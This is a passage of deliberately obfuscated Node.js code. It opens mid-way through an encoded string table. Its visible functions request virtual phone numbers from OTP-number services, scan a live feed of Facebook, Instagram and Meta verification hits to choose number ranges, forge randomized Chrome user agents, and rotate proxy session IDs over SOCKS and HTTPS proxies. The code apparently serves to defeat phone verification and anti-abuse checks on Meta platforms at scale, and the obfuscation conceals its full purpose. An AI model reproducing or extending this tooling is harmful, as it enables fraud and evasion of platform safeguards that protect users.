'w0vsuK9sxsbUCg0GAw5ZDgfSBcbMywLSzwq', 'mtj8nNWWFdeZFdv8nhWXFdeXFdj8mtb8m3W4FdL8nW', 'vKXxwu0', 'rw50zxiGtNvTyMvYCYbgAwXLifbHDgG6', 'zMLLBgq', 'ywDLBNq', 'BwvZC2fNzq', 'CMvZB2X2zq', 't1bmAxu', 'Ahr0Chm', 'CvHtz2K', 'CwLLvvm', 'icbCx19FifWGlYbFxY8GxYbCFcaNx18Vif9GihWGj18GycbFifWGlYbFycb8ica', 'E30Uy29UC3rYDwn0B3iOiNjLDhvYBIb0AgLZiIKOicK', 't2jKwLO', 'icaGg1SZm20', 'yMfZzty0', 'BxnNx2nVzgu', 'mtqWtMHLs1rH', 'C29Tzq', 'zNnTvem', 'Afbnv04', 'y05KAve', 'u2P3seG', 'wwjiCeq', 'Ahr0ChmTChjVEhKTywDLBNq', 'rMf0ywWGzxjYB3i6ia', 'D01nshK', 'D2HPBguGkhrYDwuPihT9', 'u2f2zsbRzxK/', 'DfLRyMe', 'icaG', 'CMvWzwf0', '4QYf77IpiejHy2S', 'mM9VotOGvgLTzw91Da', 'EgHfD1e', '4PscifVIGkjDifLVDxiGsfDjrca6ia', 'wwTjqwq', 'u01tiejVD2vYigvYCM9YoIa', 'y291BNrLCG', 'z3jmBu8', 'yNvPBgrnyxG', 'DKDVuuS', 'iZq0rKy4oa', 'yM9SDa', 'C3fVz3u', 'wK95zKC', 'yurysMW', 'iefqssblzxKGkg1HDxrOyxbPktO', 'ihWG', 'C2vYDMLJzq', 'C2vYDMvYrw5KCg9PBNq', 'vNveBuu', 't1v1B2e', 'C3vJy2vZC2z1Ba', 'EwzPBg4', 'AhDPza', 'u2nYyxbLCIblAw5NicaGicaGicaGicaGicaGica', 'AxnbCNjHEq', 'y3b1CW', '8j+tIIbtAg93ihrVCca1icyGC2vSzwn0', 'y1LNzgy', 'AKfJyLK', 'tw96AwXSys81lJaGke1Hy2LUDg9ZAdSGsw50zwWGtwfJie9tifGGmtbFmtvFnYKGqxbWBgvxzwjlAxqVntm3lJm2icHlsfrntcWGBgLRzsbhzwnRBYKGq2HYB21LlW', 'zvnjzM8', 'CgXHDgzVCM0', 'CgfKrw5K', 'qNHdCgy', 'icaJicaGuMfUz2uGicaGicaGicaGicaGieHPDhmGiefWChm', 'zMfJzwjVB2S', 'CMvHzgXPBMu', 'CMvK', 'Ahr0Chm6lY9KBZbXAxC3Cwu3CZrSlMnSB3vKzNjVBNqUBMv0', 'wMzuAeS', 'icbFx19Fksb8icHFFcaOxYKGFcb8ihWGkf98ihWGFcb8ihWGFcb8icHFFcb8ica', 'suX0z1e', 'cIaG4PYxiezPBguGBM90igzVDw5KoIa', 'wvHQEfK', 'mdaWmdaWmdaWmdaWmdaWma', 'EMvUzxHdB25MAwC', 'u0TjtKCT', 'icaGx19Fx18GicaGicaGicaGicaGicaGicaGicaGicaGicaGicaGicaGicaGicaG', 'yNPfzhm', 'u2vUzgLUzYbpvfaGDg8G', 'A252rw0', 't25LrhjPDMuGlsbqzxjZB25HBa', 'yxbPs2v5', 'iokaLca', 'cIaGw1jHBMDLiezPBMrLCL0GrMv0y2HPBMCGBgL2zsbJB25ZB2XLigzLzwqUlI4', 'C2fIt2W', 'CgfKu3rHCNq', 'y29VBa', 'CKvku3G', 'BxjHyM4', 'DeLWExa', 'ENHKwwy', 'v3Duy2q', 'cIaG4PYxieXPy2vUC2uGDMvYAwzPy2f0Aw9UigzHAwXLzc4GrxHPDgLUzY4k', 'DKXvveS', 'v3f2rfe', 'se9jy0y', 'i0zdndiZmW', 'zNjVBq', 'BMv4yunVBMzPzW', 'rNrWuvi', 'ihXFx19FxY8Gxf9Fx1XFx18VFf98icbCx18Sx3XFFcb8x3WGFf98xf9Flf98icak', 'z2fTzxi', 'wgrbDKK', 'rMfPBgvKig9Uia', '4PQHifPLBMv4', 'tK5eBfq', 'u21ZqM93zxiGDgLTzw91Da', 'yMXHEMu', 'C29JA3mTChjVEhKTywDLBNq', 'cIaG4PYxie5VigHPDhmGAw4Gy29UC29SzsbMzwvKlGO', 'EezrChy', 'y2jnsvm', 'BNvTyMvY', 't2f6CKq', 'cIaG4PYxieLUDgvYBMfSifnLCNzLCIbfCNjVCIaOntaWks4GugXLyxnLihrYEsbHz2fPBIbSyxrLCI4k', 'iokgKIa', 'rw50zxiGBMv3igTLEq', 'ywrKtg9N', 'zxHWAxjLza', 'vLPxCxe', 'CMvTB3zLtgLZDgvUzxi', 'EMvUzxG', 'Cfvysxu', 'icaGicaBwZKWBq', 'x3bYB2nLC3m', 'l2fWAs9WAw5N', 'DhLWzq', 'DKPfvfO', 'yxr0zw1WDd0', 'vMvYAwz5Aw5NieXPy2vUC2uUlI4GicaGicaGica', 'EK52CwK', 'Bwf1DgHHCgK', 'wgPlA2e', 'rNnerKu', 'seLtrMi', 'cLTtrvrvuf0Gsw5ZDgfSBgLUzYbKzxbLBMrLBMnPzxmUlI4', 'u2vJlunOlvvHlu1VyMLSzq', 'BNvTyMvYCY50Ehq', 'DMfSDwu', '4Psu4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psy', 'tw5hEe8', 'wwvZ', 'lIbbzgqGyw5VDgHLCJ8', 'sMD6tKe', 'BMLUAMe', 'iefqssaO', 'zMT2qw8', '8j+tGsbfBNrLCIbqCM94AwvZiezPBguGugf0Aa', 'Agv4', 'A0fHs2i', 'icaVif9Fx198icaGicaGicaGicaGicaGicaGicaGicaGicaGicaGicaGicaGicaG', 'igHPDhmk', 'DxnLCM5HBwu', 'yxbWx2LK', 'ChjVy2vZC2vK', 'sg93ig1HBNKGBNvTyMvYCZ8Gw2rLzMf1Bhq6iduWxtO', '4PYtieXVywrLzca', 'xsbB', 'rwXOA24', 'wfn4EwW', '4PYp77Ipien1C3rVBsbgAwXLifbHDgG', 'tMv4yu9uudOGsw52ywXPzcbYzxnWB25Zzq', 'rwD6DM8', 'y3vZDg9T', 'CgHVBMvFB3rWx3nLBNq', 'z05VqKe', 'sfruuca', 'Ewvot3u', 'uvbxB0e', 'y09Ny3q', 'tK5lD3O', 'z0fVqKK', 'iokCLYbty3jHCgvYieTPBMC', 'C2LN', 'uLH4tNO', 'yMfJAW', 'vfvcuwG', 'D2Trq2m', 'zwfNBgu', 'uuD6vfi', 'C29JA3m0', 'CMv0CMLLCW', 'BM8GBNvTyMvY', 'BM9FCgX1C19UDw1Izxi', '8j+uPsbbDxrVigzLDgnOigzYB20Gu3rLEcaOmM9VosK', 'zLPkuK0', 'wMvUzxGGDgLTzw91Da', 'zMLYzq', 'rw50zxiGuhjVEgLLCYbgAwXLifbHDgGGkg9YicDIywnRjYK6', 'zw50CMLLCW', 'q0vqz2O', 'mc41', '8j+tSsbbDxrVigzLDgnOigzYB20Gu01tiejVD2vY', 'zgvIDwCUDhH0', 'zMLUza', 'zM5mDLu', 'zNnWqu0', 'icaO', 't1rqihnLBNqGkhzLCMLMAwnHDgLVBIbWzw5KAw5Nkq', 'ChjVEgLLCY50Ehq', 'ifnHzMfYAs81mZCUmZy', 'D29YA2vYx3rOCMvHzhm', 'DxbKyxrL', 'wMvUzxGGA2v5igzVDw5KicG', 'sgz6rgy', 'C2LNBNvWlxjLC3bVBNnL', 'u2vYDMvYidiGkc9WmI9NzxqP', 'EgvjwM8', 'mtz4ufjVyvy', 'zNP4rwC', '8j+tUeLhka', 'iLDPBMrVD3mI', 'zMLSDgvY', 'tM8GAgfYzhDHCMuGzgf0yq', 'C29YDa', 'tgLJzw5Zzwq', 'zM94', 'tK5Xyu0', 'icboBYbWCM94AwvZignVBMzPz3vYzwqGkhj1BM5PBMCGzgLYzwn0kq', 'mYbszxrYAwvZ', 'zNvUy3rPB24GkLWOicPCkq', 'u3DPDvK', 'yxbWBgLJyxrPB24VANnVBG', 's2ffrgC', 'C29JA3m0oI8V', 'C2LK', 'zgvMBgf0zq', 'qNHqBxe', 'CMv0CNK', 'igTLEsbMB3vUzcaO', 'u3vJy2vZC2z1Ba', 'tMv4yu9uucbUzxr3B3jRoIa', 'DgD1weK', 'C3rHDhvZq29Kzq', 'yw5KCM9Pza', 'zMfPBgvK', 'B2nlugm', '4QYf77IpieDViejHy2S', 'CgLWzq', 'tw96AwXSys81lJaGkfDPBMrVD3mGtLqGmtaUmdSGv2LUnJq7ihG2ncKGqxbWBgvxzwjlAxqVntm3lJm2icHlsfrntcWGBgLRzsbhzwnRBYKGq2HYB21LlW', 'msbszxrYEq', 'g1SYsHTBsa', 'rMf0ywWGzxjYB3iGB24G', 'AwjPExC', 'y3Dqq20', 'cIaG4PYxieHxsuqGAw50zwDYAxr5ignOzwnRigzHAwXLzc4GvgfTCgvYAw5NigrLDgvJDgvKlGO', 'CeHgDKC', 'EMvUzxHFA2v5lNr4Da', 'BMv3', 'u0vmrunuie5vtujfuIbtt1vsq0u', 'q2roCMK', 'A01yuvG', 'cIaG4PYxienssvrjq0fmifnfq1vssvrziefmrvjuoIbsDw50Aw1Lig1LBw9YEsbPBMPLy3rPB24Gzgv0zwn0zwqU', 'v3f3A2y', 'l2fWAs92zxjPzNK', 'zgvZDhjVEq', 'u2vSzwn0ihjHBMDLCZO', 'BLLOtNm', 're9nA1O', 'cIaGrw50zxiGC2vSzwn0Aw9UicHLlMCUideSmYb8ideGmIa1ihWGms0ZkqO', 'zePgy3q', 'y29Kzq', 'y29sse4', '4OYO77Ipien1C3rVBs4UlG', 'g1SYsHTBm0OBw0G', 'y2f0y2G', 'AM9PBG', 'jMfJDgLVBJ1NzxroDw1IzxiMC2vYDMLJzt0', 'DxnLCG', 'wwv0teq', 'qwnJzxb0luvUy29KAw5N', 'EwvSBg93', 'l01yuZq3rKXgwdbvl3rUzxzZl0bWDwjSAwmVyxbPl2DLDg51Bq', 'cIaG4PYtifnLBgvJDgvKoIa', 'CfPgEfq', 'wxLSz0u', 'AxnuvfK', 'ChjVDMLKzxi', 'yxbWzw5KrMLSzvn5BMm', 'Befmqxe', 'CMvXDwvZDa', 'CuPHzey', 'yufzvum', 'q0Xtsuy', 'BMfTzq', 'yM9Sza', 'uu5gv3y', '8j+AQYboB25LicHeAxjLy3qGq29UBMvJDgLVBIK', 'rw50zxiG', 'zLLAvei', 'Aw5WDxq', 'Dxbeq3m', 'wff1qLy', 'ugHVBMuGywXYzwfKEsbYzwDPC3rLCMvK', 'yxbPlNPLBMv4lMnSB3vK', 'Bg9N', 'Bwv0yq', 'jMnVDw50CNK9', 'B1PVvLy', 'yNjxzwK', 'u2vJlunOlvvH', 'ls0Tls1cruDjtIbqvujmsumGs0vzls0Tls0ktunVD0jrwurlmLz3qxLfquLvn1bJnZvHBYTgBJDyr0m3A0zhzurOn0PbCZnVne5ttdjmz21omfLTzLK9cI0Tls0Tru5eifbvqKXjqYblrvKTls0Tlq', 'Dg9mB3DLCKnHC2u', 'ChjVEgLLC0zPBgu', 'wfbfDwS', 't1rqihnLBNq', 's3PQA3q', 'mJe4nfPgvg5fzW', 'Aw5PDa', 'Dg90ywXTzw0', 'DKfxD3O', 'rw50zxiGy3vZDg9TihrOCMvHzhmGkdeTntaPoG', 'C0HqrhG', 'uhjLBwL1BsbmAwnLBNnLicaGicaGicaGicaGica', 'vMfrr2K', 'zhf2A1G', 'zw5KC1DPDgG', 'zMfPBgvKlNr4Da', 'zufgCe8', 'iZaWqZLbnW', 'vw5LEhbLy3rLzcbYzxnWB25ZztOGsfruuca', 'jg1Nid0GkeDLDc1jDgvTuhjVCgvYDhKGj0Hlte06xfnprLrxqvjfxe1Py3jVC29MDfXdCNLWDg9NCMfWAhKNic1fCNjVCKfJDgLVBIbtAwXLBNrSEunVBNrPBNvLks5nywnOAw5Lr3vPzdSG', 'EhLmzgu', 'Fe9uuf9tru5uFa', 'zuDbvLm', 'vNzJqwy', 'zMLSzq', 'rKvhB0S', 'BwfW', 'sxPjze4', 'r3L0vMO', 'mM9VosbUzxr3B3jRoIa', 'C2v0uMf3tw9Kzq', 'v0THCgm', 'DM9SDhHFA2v5lNr4Da', 'zgvSzxrL', 'mM9VotOGtM8GBNvTyMvY', 'BunoqKK', 'DxnL', 'qZPCv2LUzg93C1XtExn0zw0ZmLXxAw5KB3DZug93zxjtAgvSBfX2ms4WxhbVD2vYC2HLBgWUzxHLic1oB1bYB2zPBguGlunVBw1HBMqGiG', 'sffQEhK', 'u0vmrunuifbst1Hzie1preu', 'y3j5ChrV', 'uMvTB3zLihnHDMvKigTLEq', 'quTJr1a', 'twfiB1q', 'A3z1vgS', 'rw50zxiGugHVBMuGtNvTyMvYicHLlMCUicSYmZq4mdeYmZq1nJC4ktO', 'zMfZDa', 'uxbiBgy', 'yuvbEKS', 'v3jPDguTt3v0Chv0icGOjg1NlcrJChuSjgrPC2SSjg1IksaTAM9PBIaNFcCPiG', 'vgXLsMC', 'y0rrzNa', 'vwPcsLO', 'uxbUs24', 'wNHIt0y', 'BM92yq', 'zxbPyW', 'lxnZAwqT', 'icbtq09squ1bie9uucbtru5erviG4OcuienptvbmrvrficaGicaGicaGicaGia', 'C3rKB3v0', 'vLzYqMy', 'z2nwvhq', 'C3rVCM0', 'wvr2y3m', 's2TWwe0', 'i0zgnKiZnq', 'q05rC1u', 'thDbzgO', 'v2PYBwi', 'C25tu24', 'u2vJluzLDgnOlu1Vzgu', 'vg90ywWGvgLTzq', 'EK9Lrfe', 'icb8icbty2fUBMvKoIa', 'l2fWAs92ms9UDw1IzxjZl3aZl2DLDa', 'rK1ABK4', 'g1SYsW0k', 'yxzHAwXHyMXL', 'ihWGsfDjrdOG', 'cIaG4PYxienVDwXKig5VDcbNzw5LCMf0zsbiyxjKD2fYzsbjrc4GuNvUig9UifDPBMrVD3mGB3iGqw5KCM9Pzc4k', 'u2vJlunOlvvHlvbSyxrMB3jT', 'Eu5Ktxi', 'A2rkBfG', 'shPyEhi', 'CMvZDw1L', 'u01tiejVD2vYoIbjBNzHBgLKiefqssbRzxK', 'zxjYB3iUDxnLCL9HBhjLywr5x2v4Axn0CW', 'C2LUz2XL', 'v1fzCNG', 'zMnwEuO', 'AwnL', 'D3jPDgvgAwXLu3LUyW', 'mtaYmtG5mffRrNHXAW', 'CvDwCNC', 'C2v0vgLTzw91Da', 'C2LSDNG', 'vgLTzw91Da', 'rLzqA1O', 'C0vYD2K', 'u2nVCMfTysdIGjqGugHVBMuGt1rqicaGicaGicaGia', 'twf4ihbYAwnLihbLCIbUDw1IzxiGw2rLzMf1Bhq6idaUnv06', 'Ec1HCgKTA2v5', 'yxr0zw1WDc1LCNjVCG', 'D3jPDgu', 'CgHVBMuUDhH0', 'yK5Ks2O', 'C3vJy2vZCW', 'icaGicaGia', 'wMvUzxG6ieLUDMfSAwqGsLnptG', 'xcTCkYaQkd86w2eTEKeTwL8KxvSWltLHlxPblvPFjf0Qkq', 'Ahr0Chm6lY9WBgf5lNnJB3jHBweUy29TlW', 'qundrvntx05vtujfuJO', 'C3rYAw5NAwz5', 'ruHzEuG', 'z3jLzw5cCMLNAhq', 'C2vSzwn0', 'senTzKO', 'Cgf0Ag5HBwu', 'u2nYyxbLCIblAw5N', 'AfD2DLe', 'u1PXDMG', 'zxjYB3i', '4PQHief1Dg8GzMv0y2GGzNjVBsbwB2X0EcaOmM9VosK', 'u3rLEcdWN5sL', 'wKvUufa', 'CMfUzg9TqNL0zxm', 'DMvYAwz5', 'yxjNDG', 'CM91BMq', 'rgvSzxrLihnHDMvKigTLEq', 'EufXqM8', 'icbqCM94AwvZigXVywrLzdOG', 'quXPEwe', 'q29UC29Szsb0Aw1LB3v0', '4PYp77IpicbfBNrLCIbTyw51ywXSEq', 'D0PcAuS', 'qKPIr2K', 'Bxj6EM0', 'vg9juKW', 'quTqqvm', 'EhLyENG', 'u0vmrunuifrbuKDfvcbovu1crvjtiezjteu', 'Cg5rwK0'];
  fn1 = function () {
    return v49;
  };
  return fn1();
}
function zenexRequest(v50, v51, v52) {
  return new Promise((v53, v54) => {
    const v55 = JSON.stringify(v51),
      v56 = {
        'hostname': "api.zenex.cloud",
        'port': 0x1bb,
        'path': v50,
        'method': "POST",
        'headers': {
          'mapikey': v52,
          'Content-Type': "application/json",
          'Content-Length': Buffer.byteLength(v55)
        }
      };
    const v57 = https.request(v56, v58 => {
      let v59 = '';
      v58.on("data", v60 => v59 += v60), v58.on("end", () => {
        try {
          v53(JSON.parse(v59));
        } catch (v61) {
          v54(new Error("Zenex: Invalid JSON"));
        }
      });
    });
    v57.on("error", v62 => v54(new Error("Zenex net: " + v62.message))), v57.setTimeout(0x3a98, () => {
      v57.destroy(), v54(new Error("Zenex timeout"));
    }), v57.write(v55), v57.end();
  });
}
async function zenexFetchNumber(v63, v64) {
  const v65 = await zenexRequest("/user/getnumber", {
    'range': String(v64).trim()
  }, v63);
  if (v65?.["status"] === 0xc8 && v65?.["data"]?.["number"]) return v65.data.number;
  if (v65?.["status"] === 0x190 && v65?.["message"]?.["toLowerCase"]()["includes"]("insufficient")) throw new Error("Zenex: Insufficient balance");
  if (v65?.["status"] === 0x194 || v65?.["message"]?.["toLowerCase"]()["includes"]("no number")) throw new Error("Zenex: No numbers available for range " + v64);
  throw new Error("Zenex [" + (v65?.["status"] || "ERR") + "]: " + (v65?.["message"] || "Failed"));
}
function stripRid(v66) {
  return String(v66).trim().replace(/[xX*]+$/, '').replace(/\D/g, '');
}
function twoOoFetchNumber(v67, v68, v69) {
  return new Promise((v70, v71) => {
    const v72 = stripRid(v68),
      v73 = {};
    v73.rid = v72;
    const v74 = JSON.stringify(v73),
      v75 = {
        'hostname': "api.2oo9.cloud",
        'port': 0x1bb,
        'path': v69,
        'method': "POST",
        'headers': {
          'mauthapi': v67,
          'Content-Type': "application/json",
          'Content-Length': Buffer.byteLength(v74)
        }
      },
      v76 = https.request(v75, v77 => {
        let v78 = '';
        v77.on("data", v79 => v78 += v79);
        v77.on("end", () => {
          try {
            const v80 = JSON.parse(v78);
            if (v80?.["meta"]?.["code"] === 0xc8 && v80?.["data"]?.["no_plus_number"]) v70(v80.data.no_plus_number);else v71(new Error(v80?.["message"] || v80?.["meta"]?.["status"] || "2oo9: No number"));
          } catch (v81) {
            v71(new Error("2oo9: Invalid JSON"));
          }
        });
      });
    v76.on("error", v82 => v71(new Error("2oo9 network: " + v82.message))), v76.setTimeout(0x2710, () => {
      v76.destroy();
      v71(new Error("2oo9: Timeout"));
    });
    v76.write(v74), v76.end();
  });
}
function twoOoFetchConsole(v83, v84) {
  return new Promise((v85, v86) => {
    const v87 = {};
    v87.mauthapi = v83;
    const v88 = {};
    v88.hostname = "api.2oo9.cloud", v88.port = 0x1bb, v88.path = v84, v88.method = "GET";
    v88.headers = v87;
    const v89 = v88,
      v90 = https.request(v89, v91 => {
        let v92 = '';
        v91.on("data", v93 => v92 += v93);
        v91.on("end", () => {
          try {
            const v94 = JSON.parse(v92);
            if (v94?.["meta"]?.["code"] === 0xc8 && Array.isArray(v94?.["data"]?.["hits"])) v85(v94.data.hits);else v86(new Error(v94?.["message"] || "Console fetch failed"));
          } catch (v95) {
            v86(new Error("Console: Invalid JSON"));
          }
        });
      });
    v90.on("error", v96 => v86(new Error("Console network: " + v96.message))), v90.setTimeout(0x2710, () => {
      v90.destroy();
      v86(new Error("Console timeout"));
    }), v90.end();
  });
}
function parseTwoOoRangeSelection(v97, v98) {
  const v99 = new Set();
  const v100 = v97.split(/[\s,]+/).filter(v101 => v101);
  for (const v102 of v100) {
    const v103 = v102.match(/^(\d+)-(\d+)$/);
    if (v103) for (let v104 = +v103[0x1]; v104 <= +v103[0x2]; v104++) {
      if (v104 >= 0x1 && v104 <= v98) v99.add(v104 - 0x1);
    } else {
      const v105 = parseInt(v102);
      if (!isNaN(v105) && v105 >= 0x1 && v105 <= v98) v99.add(v105 - 0x1);
    }
  }
  return [...v99].sort((v106, v107) => v106 - v107);
}
async function autoRangeFinderFor2Oo(v108, v109, v110, v111) {
  const v112 = {};
  v112.facebook = ["facebook", 'fb'];
  v112.instagram = ["instagram", 'ig'], v112.meta = ["meta"], v112.all = ["facebook", 'fb', "instagram", 'ig', "meta", "scorama"];
  const v113 = v112,
    v114 = {};
  v114.facebook = "📘 Facebook", v114.instagram = "📸 Instagram", v114.meta = "🌐 Meta", v114.all = "📦 All";
  const v115 = v114;
  console.log(chalk.gray("\n  [Range Finder] Fetching live console feed..."));
  let v116 = [];
  try {
    v116 = await twoOoFetchConsole(v108, v109);
  } catch (v129) {
    return console.log(chalk.red("\n  ✗ Console fetch failed: " + v129.message + '\x0a')), null;
  }
  const v117 = v116.slice(0x0, 0x64);
  if (v117.length === 0x0) return console.log(chalk.red("\n  ✗ No hits in console feed.\n")), null;
  const v118 = {};
  v118.name = "📘 Facebook", v118.value = "facebook";
  const v119 = {};
  v119.name = "📸 Instagram", v119.value = "instagram";
  const v120 = {};
  v120.name = "🌐 Meta", v120.value = "meta";
  const v121 = {};
  v121.name = "📦 All";
  v121.value = "all";
  const v122 = await v110("Filter by app:", [v118, v119, v120, v121]),
    v123 = v113[v122],
    v124 = v117.filter(v130 => {
      const v131 = (v130.sid || '').toLowerCase(),
        v132 = (v130.message || '').toLowerCase();
      return v123.some(v133 => v131.includes(v133) || v132.includes(v133));
    });
  if (v124.length === 0x0) return console.log(chalk.red("\n  ✗ No hits for selected app.\n")), null;
  const v125 = {},
    v126 = {};
  for (const v134 of v124) {
    const v135 = v134.range || '';
    if (!v135) continue;
    v125[v135] = (v125[v135] || 0x0) + 0x1;
    const v136 = {};
    v136.facebook = 0x0, v136.instagram = 0x0, v136.meta = 0x0, v126[v135] = v126[v135] || v136;
    if (v113.facebook.some(v137 => (v134.sid || '').toLowerCase().includes(v137) || (v134.message || '').toLowerCase().includes(v137))) v126[v135].facebook++;
    if (v113.instagram.some(v138 => (v134.sid || '').toLowerCase().includes(v138) || (v134.message || '').toLowerCase().includes(v138))) v126[v135].instagram++;
    if (v113.meta.some(v139 => (v134.sid || '').toLowerCase().includes(v139) || (v134.message || '').toLowerCase().includes(v139))) v126[v135].meta++;
  }
  const v127 = Object.entries(v125).sort((v140, v141) => v141[0x1] - v140[0x1]).slice(0x0, 0x5);
  if (v127.length === 0x0) return console.log(chalk.red("\n  ✗ No valid ranges.\n")), null;
  const v128 = await v110("Range Finder mode:", [{
    'name': "⚡ Auto detect & send (#1 range)",
    'value': "auto"
  }, {
    'name': "📊 Show top 5 & select",
    'value': "select"
  }]);
  if (v128 === "auto") {
    const [v142, v143] = v127[0x0],
      v144 = v126[v142] || {},
      v145 = [];
    if (v144.facebook) v145.push("📘FB(" + v144.facebook + ')');
    if (v144.instagram) v145.push("📸IG(" + v144.instagram + ')');
    if (v144.meta) v145.push("🌐Meta(" + v144.meta + ')');
    return console.log(chalk.green("\n  ✓ Auto Range: " + v142 + "  (" + v143 + " hits)  " + v145.join('\x20') + '\x0a')), [v142];
  } else {
    console.log(chalk.cyan("\n  App: " + v115[v122] + "  |  Scanned: " + v124.length + " hits\n")), console.log(chalk.yellow("  #   Range              Hits  Apps")), console.log(chalk.gray("  ─".repeat(0x16))), v127.forEach(([v149, v150], v151) => {
      const v152 = v126[v149] || {};
      const v153 = [];
      if (v152.facebook) v153.push("📘FB(" + v152.facebook + ')');
      if (v152.instagram) v153.push("📸IG(" + v152.instagram + ')');
      if (v152.meta) v153.push("🌐Meta(" + v152.meta + ')');
      console.log(chalk.cyan('\x20\x20' + String(v151 + 0x1).padEnd(0x3) + '\x20') + chalk.green(v149.padEnd(0x10)) + chalk.yellow(String(v150).padEnd(0x5)) + chalk.gray('█'.repeat(Math.min(v150, 0xc)) + '\x20\x20') + (v153.join('\x20') || chalk.gray('?')));
    }), console.log(chalk.gray("\n  Enter selection (e.g. 1,3 | 1 2 5 | 1-3)\n"));
    const v146 = await v111("Select ranges:", ''),
      v147 = parseTwoOoRangeSelection(v146, v127.length);
    if (v147.length === 0x0) return console.log(chalk.red("\n  ✗ No valid selection.\n")), null;
    const v148 = v147.map(v154 => v127[v154][0x0]);
    return console.log(chalk.green("\n  ✓ Selected: " + v148.join(',\x20') + '\x0a')), v148;
  }
}
function nexaFetchNumber(v155, v156, v157) {
  return new Promise((v158, v159) => {
    const v160 = {};
    v160.range = v156, v160.format = "normal";
    const v161 = JSON.stringify(v160),
      v162 = {
        'hostname': "nexaotpservice.com",
        'port': 0x50,
        'path': v157 || "/api/v1/numbers/get",
        'method': "POST",
        'headers': {
          'X-API-Key': v155,
          'Content-Type': "application/json",
          'Content-Length': Buffer.byteLength(v161)
        }
      },
      v163 = http.request(v162, v164 => {
        let v165 = '';
        v164.on("data", v166 => v165 += v166), v164.on("end", () => {
          try {
            const v167 = JSON.parse(v165);
            v167.success && v167.number ? v158(v167.number.replace(/[^0-9]/g, '')) : v159(new Error(v167.error || "NexaOTP: No number returned"));
          } catch (v168) {
            v159(new Error("NexaOTP: Invalid response"));
          }
        });
      });
    v163.on("error", v169 => v159(new Error("NexaOTP network: " + v169.message))), v163.setTimeout(0x2710, () => {
      v163.destroy(), v159(new Error("NexaOTP: Timeout"));
    }), v163.write(v161), v163.end();
  });
}
function getRandomClient() {
  const v170 = {};
  v170.v = 0x88, v170.buildMin = 0x1bbc, v170.buildMax = 0x1c20;
  const v171 = {};
  v171.v = 0x8a, v171.buildMin = 0x1c20, v171.buildMax = 0x1c84;
  const v172 = {};
  v172.v = 0x8b, v172.buildMin = 0x1c52, v172.buildMax = 0x1cb6;
  const v173 = {};
  v173.v = 0x95, v173.buildMin = 0x1d4c;
  v173.buildMax = 0x1db0;
  const v174 = {};
  v174.v = 0x97, v174.buildMin = 0x1db0, v174.buildMax = 0x1e14;
  const v175 = {};
  v175.v = 0x98, v175.buildMin = 0x1de2, v175.buildMax = 0x1e46;
  const v176 = {};
  v176.v = 0x99, v176.buildMin = 0x1f40, v176.buildMax = 0x1fa4;
  const v177 = [v170, v171, v172, v173, v174, v175, v176],
    v178 = v177[Math.floor(Math.random() * v177.length)],
    v179 = Math.floor(Math.random() * (v178.buildMax - v178.buildMin + 0x1)) + v178.buildMin,
    v180 = Math.floor(Math.random() * 0xc8) + 0x1,
    v181 = Math.random() < 0.25;
  let v182;
  v181 ? v182 = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/" + v178.v + ".0." + v179 + '.' + v180 + " Safari/537.36" : v182 = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/" + v178.v + ".0." + v179 + '.' + v180 + " Safari/537.36";
  const v183 = {};
  return v183.ua = v182, v183.cv = v178.v, v183;
}
function parseProxy(v184) {
  if (!v184) return null;
  if (typeof v184 === "object") return v184;
  v184 = v184.trim();
  if (!v184) return null;
  let v185 = "http";
  (v184.toLowerCase().startsWith("socks5://") || v184.toLowerCase().startsWith("socks4://")) && (v185 = v184.split("://")[0x0].toLowerCase());
  if (v184.includes("://")) v184 = v184.split("://")[0x1];
  let v186, v187, v188, v189;
  if (v184.includes('@')) {
    const v191 = v184.split('@'),
      v192 = v191[0x0].split(':'),
      v193 = v191[0x1].split(':');
    v188 = v192[0x0], v189 = v192[0x1], v186 = v193[0x0], v187 = parseInt(v193[0x1]);
  } else {
    const v194 = v184.split(':');
    if (v194.length === 0x2) v186 = v194[0x0], v187 = parseInt(v194[0x1]);else {
      if (v194.length === 0x4) !isNaN(parseInt(v194[0x3])) && isNaN(parseInt(v194[0x1])) ? (v188 = v194[0x0], v189 = v194[0x1], v186 = v194[0x2], v187 = parseInt(v194[0x3])) : (v186 = v194[0x0], v187 = parseInt(v194[0x1]), v188 = v194[0x2], v189 = v194[0x3]);else v194.length === 0x3 && (v186 = v194[0x0], v187 = parseInt(v194[0x1]), v188 = v194[0x2]);
    }
  }
  if (!v186 || !v187) return null;
  const v190 = {};
  v190.type = v185, v190.host = v186, v190.port = v187;
  return v190.user = v188, v190.pass = v189, v190;
}
function rotateSessionId(v195) {
  if (!v195 || !v195.user) return v195;
  const v196 = {
      ...v195
    },
    v197 = v196,
    v198 = crypto.randomBytes(0x6).toString("base64").replace(/[+/=]/g, '').slice(0x0, 0xa);
  if (v197.user.includes("-ssid-")) v197.user = v197.user.replace(/-ssid-[A-Za-z0-9_]+/, "-ssid-" + v198);else {
    if (v197.user.includes("-session-")) v197.user = v197.user.replace(/-session-[A-Za-z0-9_]+/, "-session-" + v198);else {
      if (/_sid_/i.test(v197.user)) v197.user = v197.user.replace(/_sid_[A-Za-z0-9]+/i, "_sid_" + v198);
    }
  }
  return v197;
}
function mkAgent(v199) {
  if (!v199) return null;
  if (v199.type === "socks5" || v199.type === "socks4") {
    const v201 = v199.user ? encodeURIComponent(v199.user) + ':' + encodeURIComponent(v199.pass || '') + '@' : '';
    return new SocksProxyAgent("socks5://" + v201 + v199.host + ':' + v199.port);
  }
  const v200 = v199.user ? encodeURIComponent(v199.user) + ':' + encodeURIComponent(v199.pass || '') + '@' : '';
  return new HttpsProxyAgent("http://" + v200 + v199.host + ':' + v199.port);
}
function sendRequest(v202, v203, v204, v205, v206, v207) {
  return v207 = v207 || 0x7530, new Promise((v208, v209) => {
    const v210 = new URL(v202);
    const v211 = {
        ...v204
      },
      v212 = v211;
    if (!v212["Accept-Encoding"]) v212["Accept-Encoding"] = "gzip, deflate, br, zstd";
    if (v205) v212["Content-Length"] = Buffer.byteLength(v205);
    const v213 = {};
